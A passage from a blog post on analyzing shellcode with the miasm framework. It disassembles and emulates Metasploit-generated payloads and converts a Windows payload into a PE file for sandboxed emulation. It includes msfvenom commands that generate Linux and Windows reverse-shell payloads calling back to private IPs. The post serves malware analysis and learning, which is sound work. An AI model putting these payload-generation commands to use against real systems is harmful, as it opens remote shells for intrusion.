<!DOCTYPE html>
<html lang="en">

<head>
  <title>Analyzing Shellcodes with Miasm for Fun and Profit | </title>

  <meta charset="UTF-8">
  <meta name="language" content="en">
  <meta name="description" content="">
  <meta name="keywords" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">

  
  

  <link rel="shortcut icon" type="image/png" href="/favicon.ico" />

  
  
    
 
  
  

  

  
    
    <link rel="stylesheet" href="/css/post.min.a37e0a4baf346423e1637350f2a31c69622c6d9cb0f81f78f5a90e5a04ba1795.css" integrity="sha256-o34KS680ZCPhY3NQ8qMcaWIsbZyw&#43;B949akOWgS6F5U="/>
  
    
    <link rel="stylesheet" href="/css/custom.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css" integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU="/>
  

  
   
    

<script type="application/ld+json">
  
    { 
      "@context": "http://schema.org", 
      "@type": "WebSite", 
      "url": "https:\/\/maynier.eu\/blog\/2020\/04\/04\/analyzing-shellcodes-with-miasm-for-fun-and-profit\/",
      "name": "Analyzing Shellcodes with Miasm for Fun and Profit",
      "author": {
        "@type": "Person",
        "name": ""
      },
      "description": ""
    }
  
  </script>


</head>

<body>
  <div class="burger__container">
  <div class="burger" aria-controls="navigation" aria-label="Menu">
    <div class="burger__meat burger__meat--1"></div>
    <div class="burger__meat burger__meat--2"></div>
    <div class="burger__meat burger__meat--3"></div>
  </div>
</div>


  <nav class="nav" role="navigation">
  <ul class="nav__list">
    
    
      <li>
          
          
          
        <a  class="active" href="/">home</a>
      </li>
    
      <li>
          
          
          
        <a  class="active" href="/post/">blog</a>
      </li>
    
      <li>
          
          
          
        <a  href="/projects/">projects</a>
      </li>
    
      <li>
          
          
          
        <a  href="/resources/">resources</a>
      </li>
    
      <li>
          
          
          
        <a  href="/about/">about</a>
      </li>
    
      <li>
          
          
          
        <a  href="/contact/">contact</a>
      </li>
    
    <li></li>
    <li>
        
        EN
        
        
        
            <a href="/fr" lang="fr" class="no-translation">FR</a>
        
        
    </li>
  </ul>
</nav>


  <main>
    
    

    <div class="flex-wrapper">
      <div class="post__container">
        <div class="post">
          <header class="post__header">
            <h1 id="post__title">Analyzing Shellcodes with Miasm for Fun and Profit</h1>
            <time datetime="2020-04-04 00:00:00 &#43;0200 CEST" class="post__date">4 Apr 2020   &middot; 10 minutes read </time>
          </header>
          <article class="post__content">
              
<p>Shellcodes are an interesting piece of software because they have to run with unusual constraints. They are also small enough to be used to learn new tools. I have been wanting to learn to use <a href="https://github.com/cea-sec/miasm">miasm</a> for a long time (since I saw the first presentation at SSTIC some years ago), I finally used a few nights of confinement to learn that, here is a short summary.</p>
<h2 id="linux-shellcode">Linux shellcode<a class="anchor" href="#linux-shellcode">#</a></h2>
<p>Let&rsquo;s start with a Linux shellcode as they are less complex than Windows shellcodes.</p>
<pre tabindex="0"><code>msfvenom -p linux/x86/exec CMD=/bin/ls -a x86 --platform linux -f raw &gt; sc_linux1
</code></pre><p>Let&rsquo;s disassemble the shellcode with miasm :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> miasm.analysis.binary <span style="color:#f92672">import</span> Container
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> miasm.analysis.machine <span style="color:#f92672">import</span> Machine
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;sc_linux1&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    buf <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>container <span style="color:#f92672">=</span> Container<span style="color:#f92672">.</span>from_string(buf)
</span></span><span style="display:flex;"><span>machine <span style="color:#f92672">=</span> Machine(<span style="color:#e6db74">&#39;x86_32&#39;</span>)
</span></span><span style="display:flex;"><span>mdis <span style="color:#f92672">=</span> machine<span style="color:#f92672">.</span>dis_engine(container<span style="color:#f92672">.</span>bin_stream)
</span></span><span style="display:flex;"><span>mdis<span style="color:#f92672">.</span>follow_call <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span> <span style="color:#75715e"># Follow calls</span>
</span></span><span style="display:flex;"><span>mdis<span style="color:#f92672">.</span>dontdis_retcall <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span> <span style="color:#75715e"># Don&#39;t disassemble after calls</span>
</span></span><span style="display:flex;"><span>disasm <span style="color:#f92672">=</span> mdis<span style="color:#f92672">.</span>dis_multiblock(offset<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>print(disasm)
</span></span></code></pre></div><p>And we get the following code :</p>
<pre tabindex="0"><code>loc_key_0
PUSH       0xB
POP        EAX
CDQ
PUSH       EDX
PUSHW      0x632D
MOV        EDI, ESP
PUSH       0x68732F
PUSH       0x6E69622F
MOV        EBX, ESP
PUSH       EDX
CALL       loc_key_1
-&gt;	c_to:loc_key_1
loc_key_1
PUSH       EDI
PUSH       EBX
MOV        ECX, ESP
INT        0x80
[SNIP]
</code></pre><p>Nothing really surprising here, INT 0x80 is calling the system and the syscall code is moved to EAX on the first line, 0xB being the code for <code>execve</code>. We can easily get the address of the data after the <code>CALL loc_key_1</code> by taking the data between the instruction address + size and the address of <code>loc_key1</code> :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> inst <span style="color:#f92672">=</span> list(disasm<span style="color:#f92672">.</span>blocks)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>lines[<span style="color:#ae81ff">10</span>] <span style="color:#75715e"># Instruction 10 of block 0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> print(buf[inst<span style="color:#f92672">.</span>offset<span style="color:#f92672">+</span>inst<span style="color:#f92672">.</span>l:disasm<span style="color:#f92672">.</span>loc_db<span style="color:#f92672">.</span>offsets[<span style="color:#ae81ff">1</span>]])
</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/ls</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span></code></pre></div><p>Let&rsquo;s get a more complex shellcode :</p>
<pre tabindex="0"><code>msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.2.2.14 LPORT=1234 -f raw &gt; sc_linux2
</code></pre><p>This one has conditional jumps in the code, so it is easier to read it as a graph :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> miasm.analysis.binary <span style="color:#f92672">import</span> Container
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> miasm.analysis.machine <span style="color:#f92672">import</span> Machine
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;sc_linux2&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    buf <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>container <span style="color:#f92672">=</span> Container<span style="color:#f92672">.</span>from_string(buf)
</span></span><span style="display:flex;"><span>machine <span style="color:#f92672">=</span> Machine(<span style="color:#e6db74">&#39;x86_32&#39;</span>)
</span></span><span style="display:flex;"><span>mdis <span style="color:#f92672">=</span> machine<span style="color:#f92672">.</span>dis_engine(container<span style="color:#f92672">.</span>bin_stream)
</span></span><span style="display:flex;"><span>mdis<span style="color:#f92672">.</span>follow_call <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span> <span style="color:#75715e"># Follow calls</span>
</span></span><span style="display:flex;"><span>mdis<span style="color:#f92672">.</span>dontdis_retcall <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span> <span style="color:#75715e"># Don&#39;t disassemble after calls</span>
</span></span><span style="display:flex;"><span>disasm <span style="color:#f92672">=</span> mdis<span style="color:#f92672">.</span>dis_multiblock(offset<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>open(<span style="color:#e6db74">&#39;bin_cfg.dot&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>)<span style="color:#f92672">.</span>write(disasm<span style="color:#f92672">.</span>dot())
</span></span></code></pre></div><figure class="center"><img src="/media/miasm/graph1.png" width="350">
</figure>

<p>This is a bit more work to understand statically, so let&rsquo;s see if we can emulate it with miasm.</p>
<p>It is pretty easy to emulate instructions :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> miasm.analysis.machine <span style="color:#f92672">import</span> Machine
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> miasm.jitter.csts <span style="color:#f92672">import</span> PAGE_READ, PAGE_WRITE
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>myjit <span style="color:#f92672">=</span> Machine(<span style="color:#e6db74">&#34;x86_32&#34;</span>)<span style="color:#f92672">.</span>jitter(<span style="color:#e6db74">&#34;python&#34;</span>)
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>init_stack()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;sc_linux2&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>run_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40000000</span>
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>vm<span style="color:#f92672">.</span>add_memory_page(run_addr, PAGE_READ <span style="color:#f92672">|</span> PAGE_WRITE, data)
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>set_trace_log()
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>run(run_addr)
</span></span></code></pre></div><p>Miasm emulates all the instructions until we reach the first int 0x80 call :</p>
<pre tabindex="0"><code>40000000 PUSH       0xA
EAX 00000000 EBX 00000000 ECX 00000000 EDX 00000000 ESI 00000000 EDI 00000000 ESP 0123FFFC EBP 00000000 EIP 40000002 zf 0 nf 0 of 0 cf 0
40000002 POP        ESI
EAX 00000000 EBX 00000000 ECX 00000000 EDX 00000000 ESI 0000000A EDI 00000000 ESP 01240000 EBP 00000000 EIP 40000003 zf 0 nf 0 of 0 cf 0
[SNIP]
40000010 INT        0x80
EAX 00000066 EBX 00000001 ECX 0123FFF4 EDX 00000000 ESI 0000000A EDI 00000000 ESP 0123FFF4 EBP 00000000 EIP 40000012 zf 0 nf 0 of 0 cf 0
Traceback (most recent call last):
  File &#34;linux1.py&#34;, line 11, in &lt;module&gt;
    myjit.run(run_addr)
  File &#34;/home/user/tools/malware/miasm/miasm/jitter/jitload.py&#34;, line 423, in run
    return self.continue_run()
  File &#34;/home/user/tools/malware/miasm/miasm/jitter/jitload.py&#34;, line 405, in continue_run
    return next(self.run_iterator)
  File &#34;/home/user/tools/malware/miasm/miasm/jitter/jitload.py&#34;, line 373, in runiter_once
    assert(self.get_exception() == 0)
AssertionError
</code></pre><p>By default, the miasm machine does not execute system calls, but it is possible to add an exception handler for the exception <code>EXCEPT_INT_XX</code> (<code>EXCEPT_SYSCALL</code> for Linux x86_64) and implement it ourselves. Let&rsquo;s just print the syscall numbers first :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> miasm.jitter.csts <span style="color:#f92672">import</span> PAGE_READ, PAGE_WRITE, EXCEPT_INT_XX
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> miasm.analysis.machine <span style="color:#f92672">import</span> Machine
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exception_int</span>(jitter):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Syscall: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(jitter<span style="color:#f92672">.</span>cpu<span style="color:#f92672">.</span>EAX))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>myjit <span style="color:#f92672">=</span> Machine(<span style="color:#e6db74">&#34;x86_32&#34;</span>)<span style="color:#f92672">.</span>jitter(<span style="color:#e6db74">&#34;python&#34;</span>)
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>init_stack()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;sc_linux2&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>run_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40000000</span>
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>vm<span style="color:#f92672">.</span>add_memory_page(run_addr, PAGE_READ <span style="color:#f92672">|</span> PAGE_WRITE, data)
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>add_exception_handler(EXCEPT_INT_XX, exception_int)
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>run(run_addr)
</span></span></code></pre></div><p>Which gives us the syscalls :</p>
<pre tabindex="0"><code>Syscall: 102
Syscall: 102
</code></pre><p>I started to <a href="https://github.com/Te-k/analyst-scripts/blob/master/miasm/simu_sc_linux32.py">reimplement a few syscalls</a> often used by shellcodes before realizing that miasm had already <a href="https://github.com/cea-sec/miasm/blob/master/miasm/os_dep/linux/syscall.py#L1067">integrated several syscall implementations</a> and a method to have them executed by the virtual machine. I have submitted a PR for a few extra syscalls, and then we can emulate the shellcode :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>myjit <span style="color:#f92672">=</span> Machine(<span style="color:#e6db74">&#34;x86_32&#34;</span>)<span style="color:#f92672">.</span>jitter(<span style="color:#e6db74">&#34;python&#34;</span>)
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>init_stack()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;sc_linux2&#34;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>run_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40000000</span>
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>vm<span style="color:#f92672">.</span>add_memory_page(run_addr, PAGE_READ <span style="color:#f92672">|</span> PAGE_WRITE, data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>getLogger(<span style="color:#e6db74">&#39;syscalls&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>setLevel(logging<span style="color:#f92672">.</span>DEBUG)
</span></span><span style="display:flex;"><span>env <span style="color:#f92672">=</span> environment<span style="color:#f92672">.</span>LinuxEnvironment_x86_32()
</span></span><span style="display:flex;"><span>syscall<span style="color:#f92672">.</span>enable_syscall_handling(myjit, env, syscall<span style="color:#f92672">.</span>syscall_callbacks_x86_32)
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>run(run_addr)
</span></span></code></pre></div><p>And we get the following syscall trace :</p>
<pre tabindex="0"><code>[DEBUG   ]: socket(AF_INET, SOCK_STREAM, 0)
[DEBUG   ]: -&gt; 3
[DEBUG   ]: connect(fd, [AF_INET, 1234, 10.2.2.14], 102)
[DEBUG   ]: -&gt; 0
[DEBUG   ]: sys_mprotect(123f000, 1000, 7)
[DEBUG   ]: -&gt; 0
[DEBUG   ]: sys_read(3, 123ffe4, 24)
</code></pre><p>So it is pretty easy to analyze linux shellcodes with miasm, you can use <a href="https://github.com/Te-k/analyst-scripts/blob/master/miasm/simu_sc_linux.py">this script</a>.</p>
<h2 id="windows">Windows<a class="anchor" href="#windows">#</a></h2>
<p>Because it is not possible to use instructions for system calls on Windows, Windows shellcodes need to use functions from shared libraries, which requires to load them with LoadLibrary and GetProcAddress, which requires to first find these two function addresses in kernel32.dll DLL file in memory.</p>
<p>Let&rsquo;s generate a first shellcode with metasploit :</p>
<pre tabindex="0"><code>msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=443   -f raw &gt; sc_windows1
</code></pre><p>We can generate a call graph with the exact same code used for Linux above:</p>
<figure>
    <img src="/media/miasm/graph2.png" style="max-width:250px"/>
   
</figure>

<p>Here we see one of the tricks used by most shellcodes to get their own address, <code>CALL</code> is push stack the address of the next instruction to the stack, that is then stored in stored in EBP with <code>POP</code>. The <code>CALL EBP</code> at the last instruction, is thus calling the instruction just after the first call. And because only static analysis is used here, miasm cannot know which address is in EBP.</p>
<p>We can still manually disassemble the code after the first call:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>inst <span style="color:#f92672">=</span> inst <span style="color:#f92672">=</span> list(disasm<span style="color:#f92672">.</span>blocks)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>lines[<span style="color:#ae81ff">1</span>] <span style="color:#75715e"># We get the second line of the first block</span>
</span></span><span style="display:flex;"><span>next_addr <span style="color:#f92672">=</span> inst<span style="color:#f92672">.</span>offset <span style="color:#f92672">+</span> inst<span style="color:#f92672">.</span>l <span style="color:#75715e"># offset + size of the instruction</span>
</span></span><span style="display:flex;"><span>disasm <span style="color:#f92672">=</span> mdis<span style="color:#f92672">.</span>dis_multiblock(offset<span style="color:#f92672">=</span>next_addr)
</span></span><span style="display:flex;"><span>open(<span style="color:#e6db74">&#39;bin_cfg.dot&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>)<span style="color:#f92672">.</span>write(disasm<span style="color:#f92672">.</span>dot())
</span></span></code></pre></div><figure class="center"><img src="/media/miasm/graph3.png" width="350">
</figure>

<p>Here we see that the shellcode is first looking for the address of kernel32 by following <code>PEB</code>, <code>PEB_LDR_DATA</code> and <code>LDR_DATA_TABLE_ENTRY</code> structures in memory. Let&rsquo;s emulate that :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> miasm.jitter.csts <span style="color:#f92672">import</span> PAGE_READ, PAGE_WRITE
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> miasm.analysis.machine <span style="color:#f92672">import</span> Machine
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">code_sentinelle</span>(jitter):
</span></span><span style="display:flex;"><span>    jitter<span style="color:#f92672">.</span>run <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>    jitter<span style="color:#f92672">.</span>pc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>myjit <span style="color:#f92672">=</span> Machine(<span style="color:#e6db74">&#34;x86_32&#34;</span>)<span style="color:#f92672">.</span>jitter(<span style="color:#e6db74">&#34;python&#34;</span>)
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>init_stack()
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;sc_windows1&#34;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>run_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40000000</span>
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>vm<span style="color:#f92672">.</span>add_memory_page(run_addr, PAGE_READ <span style="color:#f92672">|</span> PAGE_WRITE, data)
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>set_trace_log()
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>push_uint32_t(<span style="color:#ae81ff">0x1337beef</span>)
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>add_breakpoint(<span style="color:#ae81ff">0x1337beef</span>, code_sentinelle)
</span></span><span style="display:flex;"><span>myjit<span style="color:#f92672">.</span>run(run_addr)
</span></span></code></pre></div><pre tabindex="0"><code>40000000 CLD
EAX 00000000 EBX 00000000 ECX 00000000 EDX 00000000 ESI 00000000 EDI 00000000 ESP 0123FFFC EBP 00000000 EIP 40000001 zf 0 nf 0 of 0 cf 0
40000001 CALL       loc_40000088
EAX 00000000 EBX 00000000 ECX 00000000 EDX 00000000 ESI 00000000 EDI 00000000 ESP 0123FFF8 EBP 00000000 EIP 40000088 zf 0 nf 0 of 0 cf 0
40000088 POP        EBP
EAX 00000000 EBX 00000000 ECX 00000000 EDX 00000000 ESI 00000000 EDI 00000000 ESP 0123FFFC EBP 40000006 EIP 40000089 zf 0 nf 0 of 0 cf 0
40000089 PUSH       0x3233
EAX 00000000 EBX 00000000 ECX 00000000 EDX 00000000 ESI 00000000 EDI 00000000 ESP 0123FFF8 EBP 40000006 EIP 4000008E zf 0 nf 0 of 0 cf 0
[SNIP]
4000000B MOV        EDX, DWORD PTR FS:[EAX + 0x30]
WARNING: address 0x30 is not mapped in virtual memory:
Traceback (most recent call last):
[SNIP]
RuntimeError: Cannot find address
</code></pre><p>The emulation works until it reaches <code>MOV EDX, DWORD PTR FS:[EAX + 0x30]</code>, this instructions get the TEB structure address from the FS segment in memory. But in that case, miasm is only emulating the code and has not loaded any system segment in memory. We need to use a full Windows Sandbox from miasm for that, but these VMs are only running PE files, so let&rsquo;s first use a short script using <a href="https://lief.quarkslab.com/">lief</a> to convert the shellcode to a full-figured PE file :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> lief <span style="color:#f92672">import</span> PE
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;sc_windows1&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>binary32 <span style="color:#f92672">=</span> PE<span style="color:#f92672">.</span>Binary(<span style="color:#e6db74">&#34;pe_from_scratch&#34;</span>, PE<span style="color:#f92672">.</span>PE_TYPE<span style="color:#f92672">.</span>PE32)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>section_text                 <span style="color:#f92672">=</span> PE<span style="color:#f92672">.</span>Section(<span style="color:#e6db74">&#34;.text&#34;</span>)
</span></span><span style="display:flex;"><span>section_text<span style="color:#f92672">.</span>content         <span style="color:#f92672">=</span> [c <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> data] <span style="color:#75715e"># Take a list(int)</span>
</span></span><span style="display:flex;"><span>section_text<span style="color:#f92672">.</span>virtual_address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>
</span></span><span style="display:flex;"><span>section_text <span style="color:#f92672">=</span> binary32<span style="color:#f92672">.</span>add_section(section_text, PE<span style="color:#f92672">.</span>SECTION_TYPES<span style="color:#f92672">.</span>TEXT)
</span></span><span style="display:flex;"><span>binary32<span style="color:#f92672">.</span>optional_header<span style="color:#f92672">.</span>addressof_entrypoint <span style="color:#f92672">=</span> section_text<span style="color:#f92672">.</span>virtual_address
</span></span><span style="display:flex;"><span>builder <span style="color:#f92672">=</span> PE<span style="color:#f92672">.</span>Builder(binary32)
</span></span><span style="display:flex;"><span>builder<span style="color:#f92672">.</span>build_imports(<span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>builder<span style="color:#f92672">.</span>build()
</span></span><span style="display:flex;"><span>builder<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;sc_windows1.exe&#34;</span>)
</span></span></code></pre></div><p>Let&rsquo;s now run this PE with a miasm Sandbox with the option <code>use-windows-structs</code> to load Windows structures in memory (see the code <a href="https://github.com/cea-sec/miasm/blob/b265c8af0cee47c039bad11153d1eb9ba8383f71/miasm/os_dep/win_api_x86_32_seh.py">here</a>) :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> miasm.analysis.sandbox <span style="color:#f92672">import</span> Sandbox_Win_x86_32
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Options</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>use_windows_structs <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>jitter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;gcc&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#self.singlestep = True</span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>usesegm <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>load_hdr <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>loadbasedll <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__getattr__</span>(self, name):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>options <span style="color:#f92672">=</span> Options()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create sandbox</span>
</span></span><span style="display:flex;"><span>sb <span style="color:#f92672">=</span> Sandbox_Win_x86_32(<span style="color:#e6db74">&#34;sc_windows1.exe&#34;</span>, options, globals())
</span></span><span style="display:flex;"><span>sb<span style="color:#f92672">.</span>run()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span>(sb<span style="color:#f92672">.</span>jitter<span style="color:#f92672">.</span>run <span style="color:#f92672">is</span> <span style="color:#66d9ef">False</span>)
</span></span></code></pre></div><p>The option <code>loadbasedll</code> is loading DLL structures in memory based on existing dlls in a folder called <code>win_dll</code> (you need Windows x86_32 DLLs). Upon execution, we get the following crash :</p>
<pre tabindex="0"><code>[SNIP]
[INFO    ]: kernel32_LoadLibrary(dllname=0x13ffe8) ret addr: 0x40109b
[WARNING ]: warning adding .dll to modulename
[WARNING ]: ws2_32.dll
Traceback (most recent call last):
  File &#34;windows4.py&#34;, line 18, in &lt;module&gt;
    sb.run()
    [SNIP]
  File &#34;/home/user/tools/malware/miasm/miasm/jitter/jitload.py&#34;, line 479, in handle_lib
    raise ValueError(&#39;unknown api&#39;, hex(jitter.pc), repr(fname))
ValueError: (&#39;unknown api&#39;, &#39;0x71ab6a55&#39;, &#34;&#39;ws2_32_WSAStartup&#39;&#34;)
</code></pre><p>If we look at the file jitload.py, it actually calls DLL functions implemented in <a href="https://github.com/cea-sec/miasm/blob/master/miasm/os_dep/win_api_x86_32.py">win_api_x86_32.py</a>, and we see that <code>kernel32_LoadLibrary</code> is indeed implemented but not WSAStartup, so we need to implement it ourselves.</p>
<p>Miasm is actually using a very smart trick to ease the implementation of new libraries, the sandbox accept a parameter for additional functions that is by default called with <code>globals()</code>. It means that we just have to define a function with the right name in our code, and it directly become available as a system function. Let&rsquo;s try that with <code>ws2_32_WSAStartup</code> :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ws2_32_WSAStartup</span>(jitter):
